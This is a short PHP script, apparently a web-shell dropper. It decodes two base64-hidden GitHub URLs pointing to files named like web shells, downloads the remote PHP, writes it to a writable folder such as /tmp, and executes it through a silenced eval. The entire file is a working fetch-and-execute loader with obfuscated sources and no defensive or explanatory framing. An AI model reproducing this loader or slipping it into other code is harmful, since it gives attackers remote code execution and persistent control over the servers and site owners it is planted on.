<?php
// Fungsi untuk mendapatkan konten dari URL
function get($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_URL, $url);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    curl_close($ch);
    return $http_code == 200 ? $response : false;
}

// Fungsi untuk menyimpan file ke folder yang dapat ditulis
function saveScriptToWritableFolder($fileName, $content) {
    $folders = [
        '/tmp',
        '/var/tmp',
        __DIR__
    ];

    foreach ($folders as $folder) {
        if (@is_writable($folder)) {
            $filePath = rtrim($folder, '/') . '/' . $fileName;
            if (@file_put_contents($filePath, $content) !== false) {
                return $filePath; // Kembalikan lokasi file yang berhasil disimpan
            }
        }
    }
    return false; // Tidak ada folder yang dapat ditulis
}

// Decode URL dari base64
$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hKMzAzL3dvZmxzaGVsbC9yZWZzL2hlYWRzL21haW4vbWFpbi5waHA');
$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4ZWN1dGl2ZW11ZGEvc2VrYXJhL21haW4vY29kZS9tYWluL3dzL3dzLnR4dA');

// Ambil skrip dari URL pertama atau kedua
$script = get($url1) ?: get($url2);
if ($script !== false) {
    $filePath = saveScriptToWritableFolder('script.php', $script);
    if ($filePath) {
        @eval('?>' . $script); // Mengeksekusi skrip tanpa output
    }
}
?>
